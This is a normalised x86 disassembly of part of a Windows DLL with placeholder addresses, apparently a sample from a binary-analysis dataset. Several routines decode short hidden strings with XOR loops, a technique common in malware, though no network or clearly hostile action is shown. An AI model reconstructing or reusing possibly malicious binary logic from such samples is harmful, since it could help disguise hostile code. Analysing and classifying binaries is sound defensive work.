cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax 0x82
call sub_1002f620
mov eax [ edi ]
mov eax [ eax + 0x94 ]
lea ecx [ ebp - 0x13c ]
push ecx
push edx
push edi
mov [ ebp - 0x13c ] ebx
call eax
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x138 ]
mov eax 0x94
call sub_1002f620
mov edx [ edi ]
mov edx [ edx + 0x94 ]
lea eax [ ebp - 0x13c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push edi
mov [ ebp - 0x13c ] ebx
call edx
cmp [ ebp - 0x13c ] ebx
je r-xdata
push 0x40
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp [ ebp - 0x180 ] ebx
je r-xdata
lea esi [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0x3
call sub_1002db00
lea esi [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0x2
call sub_1002db00
lea esi [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x1
call sub_1002db00
lea edi [ ebp - 0x178 ]
call sub_1005b920
lea edi [ ebp - 0x180 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10046710
lea edx [ ebp - 0xc4 ]
mov eax 0x9f
call sub_1002f620
mov [ ebp - 0x140 ] 0x7
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x180 ]
push edx
push eax
lea ecx [ ebp - 0x13c ]
call sub_1003d310
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0x109
call sub_1002f620
mov [ ebp - 0x140 ] 0x8
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x13c ]
push edx
push eax
lea ebx [ ebp - 0x178 ]
call sub_10068b80
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x37
call sub_1002f620
mov [ ebp - 0x140 ] 0x9
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x160 ]
call sub_10001a30
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x23
call sub_1002f620
mov [ ebp - 0x140 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x170 ]
call sub_1002f780
cmp eax ebx
je r-xdata
mov [ ebp - 0x140 ] 0xa
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x168 ]
call sub_100305d0
cmp eax ebx
je r-xdata
cmp [ ebp - 0x178 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x154 ]
xor ebx ebx
cmp [ ebp - 0x160 ] ebx
je r-xdata
mov edi eax
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x158 ]
xor eax eax
mov [ edx ] eax
jmp r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x180 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_10043e00
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x170 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ebp - 0x14c ]
lea eax [ ebp - 0x178 ]
push eax
mov eax [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push eax
push ecx
mov eax esi
call sub_1000d920
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x168 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x160 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_10050120
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
mov ecx eax
cmp ecx ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x8
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x170 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_10016320
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x188 ]
mov edx [ ebp - 0x144 ]
push eax
mov eax [ ebp - 0x14c ]
push edx
mov edx [ ebp - 0x148 ]
push eax
mov eax [ ebp - 0x150 ]
push edx
push eax
mov eax esi
call sub_10069c80
jmp r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_1004b800
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
mov ecx [ ebp - 0x158 ]
mov [ ecx ] eax
lea edx [ ebp - 0xa8 ]
mov eax 0xd3
call sub_1002f620
jmp r-xdata
sub_10048324
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_100704bf
call sub_1007f4b3
add esp 0x10
pop esi
pop ebp
retn
sub_10048350
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx [ rw-data ]
fld [ r--data ]
fsubr st1
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fldz
fstp [ ecx + 0xf8 ]
pop ebp
retn 0x4
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
fstp [ ecx + 0xf8 ]
pop ebp
retn 0x4
fxch st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld1
fstp [ ecx + 0xf8 ]
pop ebp
retn 0x4
pop ebp
retn 0x4
fld [ r--data ]
fstp [ ecx + 0xf8 ]
sub_10048430
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi edi
lea edx [ ebp - 0x34 ]
mov eax 0x22
call sub_1002f620
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
push 0x5c
push ebx
call sub_1006807b
add esp 0x8
lea ebx [ eax + 0x2 ]
push 0x208
lea eax [ ebp - 0x250 ]
push 0x0
push eax
call sub_1007f8f0
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov esi [ edx + 0x1c ]
push 0x2e
push esi
call sub_1006807b
mov edi eax
add esp 0x14
test edi edi
je r-xdata
xor eax eax
mov edi edi
lea edx [ ebp - 0x48 ]
mov eax 0x13
call sub_1002f620
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
sub eax esi
sar eax 0x1
add eax eax
push eax
lea ecx [ ebp - 0x250 ]
push esi
push ecx
call sub_1007f580
mov ecx [ r--data ]
add esp 0xc
xor eax eax
lea ecx [ ecx ]
inc eax
cmp eax 0x18
jb r-xdata
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x57
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x250 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call esi
push edi
lea eax [ ebp - 0x250 ]
push eax
call esi
push ebx
lea ecx [ ebp - 0x250 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x254 ]
mov eax [ edx ]
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov [ edx + 0x20 ] eax
inc [ eax + 0x1c ]
mov ecx [ ebp - 0x254 ]
mov edx [ ecx ]
mov ebx [ edx + 0x4 ]
push 0x5c
push ebx
call sub_1006807b
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100485bd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_100485e0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000fcc7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10048610
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
pop edi
mov dl 0x6f
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
add dl dl
add dl dl
add dl dl
not dl
and dl 0x20
pop edi
or dl 0x58
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
mov dl [ edi + 0x1 ]
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_100486a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100891b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov eax ecx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
lea esi [ eax + 0x1 ]
mov edi edi
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1003e780
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov ecx edx
cmp eax 0x10
jae r-xdata
add ecx [ ebp - 0x1c ]
cmp eax 0x10
mov eax edx
jae r-xdata
lea ecx [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x48 ] dx
mov edx [ ebp - 0x4c ]
push edx
push ecx
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
call sub_1006f5a0
lea edx [ ebp - 0x48 ]
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_100347b0
cmp [ ebp - 0x34 ] 0x8
mov esi eax
jb r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
sub_10048783
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10051f24
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_100487d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100882a4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x144 ] eax
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x13c ] edi
mov ecx [ r--data ]
movzx esi dx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5f
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0xc
jb r-xdata
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ax
lea eax [ ebp - 0x90 ]
push eax
call [ GetSystemTime@IAT ]
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffc
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0xb
jb r-xdata
movzx ecx [ ebp - 0x82 ]
movzx edx [ ebp - 0x84 ]
push ecx
movzx ecx [ ebp - 0x88 ]
xor eax eax
mov [ ebp - 0x32 ] ax
movzx eax [ ebp - 0x86 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x48 ]
push edx
mov ecx 0x1a
lea ebx [ ebp - 0x30 ]
call sub_1006d3c0
add esp 0x14
lea ecx [ ebp - 0x11c ]
push esi
push ecx
call sub_10057f20
add esp 0x8
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x4 ] 0x1
push 0x1
xor edx edx
mov ebx 0x7
xor esi esi
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x80 ] dx
call sub_10034100
mov [ ebp - 0x4 ] 0x2
call [ GetCurrentThreadId@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_10057f20
add esp 0x8
mov edi eax
mov [ ebp - 0x4 ] 0x3
xor ecx ecx
push 0x1
mov [ ebp - 0x64 ] cx
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] esi
call sub_10034100
lea edx [ ebp - 0x64 ]
push edx
lea edx [ ebp - 0x30 ]
lea esi [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x4
call sub_10040e00
add esp 0x4
mov ecx eax
mov eax edi
lea edi [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x5
call sub_1006b070
mov ecx eax
lea eax [ ebp - 0x80 ]
lea edi [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x6
call sub_1006b070
mov ecx eax
mov eax [ ebp - 0x140 ]
mov [ ebp - 0x4 ] bl
mov edi [ ebp - 0x144 ]
call sub_1006b070
mov [ ebp - 0x13c ] 0x1
mov esi 0x8
cmp [ ebp - 0x98 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x9c ] 0x0
mov [ ebp - 0xac ] cx
cmp [ ebp - 0xb4 ] esi
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb8 ] 0x0
mov [ ebp - 0xc8 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0xd0 ] ebx
mov [ ebp - 0xd4 ] 0x0
mov [ ebp - 0xe4 ] dx
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0xec ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0xec ] ebx
mov [ ebp - 0xf0 ] 0x0
mov [ ebp - 0x100 ] ax
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov edx [ ebp - 0x100 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x80 ] dx
cmp [ ebp - 0x108 ] esi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x108 ] ebx
mov ebx [ ebp - 0x148 ]
xor ecx ecx
mov [ ebp - 0x10c ] 0x0
mov [ ebp - 0x11c ] cx
cmp [ ebx + 0x10 ] ecx
je r-xdata
mov eax [ ebp - 0x11c ]
push eax
call sub_1000a86e
add esp 0x4
push 0x2
push r--data
mov ecx edi
call sub_10052290
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x138 ]
push r--data
push edx
call sub_10029ef0
add esp 0x8
push 0xffffffff
push 0x0
push eax
mov ecx edi
mov [ ebp - 0x4 ] esi
call sub_1006da10
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x124 ] esi
jb r-xdata
mov eax [ ebp - 0x138 ]
push eax
call sub_1000a86e
add esp 0x4
sub_10048b50
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_1006e175
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_1002f5d0
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_100302aa
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_10048e70
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_10030370
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_10048c5d
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10015270
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10048d00
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x20 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ esi ] eax
xor edx edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx ] ecx
mov eax [ esi ]
cmp eax edi
setne dl
mov [ ebp + 0x14 ] edx
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov ecx [ ebx ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
mov edx [ ebp + 0x8 ]
push edx
mov edx edi
sub edx eax
push edx
push eax
push ecx
call sub_10025a12
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] edi
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn 0x1c
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ ebx ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ ebx ] 0x2
mov [ ebp + 0x14 ] 0x0
cmp [ esi ] edi
jne r-xdata
xor eax eax
mov eax [ esi ]
lea edx [ eax + 0x1 ]
mov edi edi
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_10048db9
push 0x3c
mov eax sub_10085747
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1004ad92
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001927f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10048e70
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001ba48
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_10048e9e
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10083a09
pop edi
pop ebp
retn
sub_10048ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086b77
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
xor edi edi
mov [ esi ] r--data
push edi
mov ebx 0x7
xor eax eax
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push edx
mov [ ecx ] ax
call sub_1002d970
mov ax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0x20 ] ax
mov eax [ ebp + 0x10 ]
push 0xffffffff
lea ecx [ esi + 0x24 ]
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1002d970
mov eax [ ebp + 0x14 ]
push 0xffffffff
lea ecx [ esi + 0x40 ]
mov [ ebp - 0x4 ] 0x1
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1002d970
mov eax [ ebp + 0x18 ]
push 0xffffffff
lea ecx [ esi + 0x5c ]
mov [ ebp - 0x4 ] 0x2
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1002d970
mov eax [ ebp + 0x1c ]
push 0xffffffff
lea ecx [ esi + 0x78 ]
mov [ ebp - 0x4 ] 0x3
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1002d970
mov eax [ ebp + 0x20 ]
push 0xffffffff
lea ecx [ esi + 0x94 ]
mov [ ebp - 0x4 ] 0x4
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1002d970
mov ecx [ ebp + 0x24 ]
mov edx [ ebp + 0x28 ]
mov [ esi + 0xb0 ] ecx
mov [ esi + 0xb4 ] edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_10048fd4
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10049018
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
